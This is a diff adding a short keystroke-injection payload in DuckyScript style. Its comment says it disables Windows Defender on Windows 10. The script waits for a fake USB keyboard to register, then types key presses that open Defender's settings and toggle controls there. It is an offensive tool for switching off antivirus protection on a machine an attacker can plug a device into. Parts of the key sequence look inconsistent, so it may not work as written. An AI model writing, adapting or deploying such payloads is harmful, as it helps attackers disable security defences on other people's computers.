@@ -1,0 +1,24 @@
+REM Disable the Windows Defender in Windows 10
+
+REM Most older machines will probably need more delay
+
+REM let the HID enumerate
+DELAY 2000
+ESCAPE
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING Windows Defender Settings
+ENTER
+DELAY 2000
+TAB
+DELAY 50
+HOME
+DELAY 50
+ALT F4
+DELAY 3200
+GUI a
+DELAY 500
+ENTER
+DELAY 100
+GUI a
